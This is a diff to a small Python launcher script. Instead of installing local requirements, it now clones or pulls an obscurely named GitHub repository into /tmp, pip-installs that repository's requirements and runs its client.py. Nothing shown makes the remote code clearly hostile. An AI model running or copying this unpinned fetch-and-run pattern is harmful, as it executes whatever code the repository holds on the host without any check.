@@ -2,26 +2,48 @@ import os
 import sys
 import subprocess
 
-TARGET = "/tmp/python_packages"
+REPO_URL = "https://github.com/yawnerss/livtrmnlasdasd.git"
+REPO_DIR = "/tmp/livtrmnlasdasd"
+PKG_DIR = "/tmp/python_packages"
 
-os.makedirs(TARGET, exist_ok=True)
+os.makedirs(PKG_DIR, exist_ok=True)
 
-# Make packages installed into /tmp importable
-if TARGET not in sys.path:
-    sys.path.insert(0, TARGET)
+env = os.environ.copy()
+env["PYTHONPATH"] = PKG_DIR + os.pathsep + env.get("PYTHONPATH", "")
 
-# Install requirements into /tmp
+# Clone or update the repository
+if not os.path.exists(REPO_DIR):
+    subprocess.check_call([
+        "git",
+        "clone",
+        REPO_URL,
+        REPO_DIR
+    ])
+else:
+    subprocess.check_call([
+        "git",
+        "-C",
+        REPO_DIR,
+        "pull"
+    ])
+
+# Install requirements into /tmp/python_packages
 subprocess.check_call([
     sys.executable,
     "-m",
     "pip",
     "install",
     "--target",
-    TARGET,
+    PKG_DIR,
     "-r",
-    "requirements.txt",
+    os.path.join(REPO_DIR, "requirements.txt")
 ])
 
-# Example imports
-import requests
-import socketio
+# Change into the repository
+os.chdir(REPO_DIR)
+
+# Run client.py using the installed packages
+subprocess.check_call(
+    [sys.executable, "client.py"],
+    env=env
+)
